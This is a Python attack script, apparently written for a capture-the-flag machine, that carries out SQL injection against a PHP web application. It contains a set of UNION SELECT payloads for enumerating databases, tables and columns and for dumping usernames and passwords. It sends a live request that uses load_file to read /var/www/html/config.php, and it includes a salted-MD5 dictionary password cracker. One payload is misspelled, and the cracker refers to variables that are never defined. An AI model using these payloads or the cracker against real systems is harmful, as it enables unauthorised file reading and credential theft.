#!/usr/bin/python3

import requests
from pwn import *
from pprint import pprint
from hashlib import md5


MAIN_URL = "http://10.10.11.128/"

SQL_PAYLOADS = {

    "databases":"union select 1,2,schema_name from information_schema.schemata-- -",
    "tables":"union select 1,2, table_name from information_schema.tables where table_schema='database_name'-- -",
    "rows":"union select 1,2,column_name from information_scheme.columns where table_schema='' and table_name=''",
    "rows_information":"union select 1,2,group_concat(username, '0x3a', password) from cmsmsdb.cms_users-- -"
}

"""
These are the players stored in the database november
as the table players
Sorry, [
    ippsec,
    celesian,
    big0us,
    luska,
    tinyboy
] you are not eligible due to already qualifying.



And in the flag table the only one record is UHC{F1rst_5tep_2_Qualify}
"""


def enumeration():

    log.progress("performing database enumeration...")
    # auth_cookies = "BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA"
    # cms_cookies = "i4v7mamlaopv2ge8o8qjgvth76"
    over_ress = requests.post(url=MAIN_URL+"index.php", 
            cookies={"Cookie":"PHPSESSID=l3iejff9qkdni77spr1cv3vuqe"},
            headers={"Content-Type":"application/x-www-form-urlencoded"},
            # performing a sqli with the table and column name
            # flag    :   one   :   ,players    :   player   :    you are not eligible due to already qualifying. 
            data={"player":"honeyload' union select load_file('/var/www/html/config.php')-- -"})
    
    if over_ress.status_code != 200:
        log.failure("Error in the table enumeration")
        exit(1)
    print(over_ress.text)
    log.success("process was done successfully")



def password_cracker():
    
    with open(DICT_LIST, "rb") as file:
        for x in file:
            if md5(SALT.encode() + x.strip()).hexdigest() == PASS:
                log.success(f"The password for editor is: {x.strip().decode()}")
                exit(0)



def main():
    
    try:
        enumeration()
        # password_cracker()

    except Exception as e:
        print(str(e))
        exit(1)


    except KeyboardInterrupt:
        log.info("\n\nExiting...\n\n")
        exit(0)




if __name__ == "__main__":
    main()
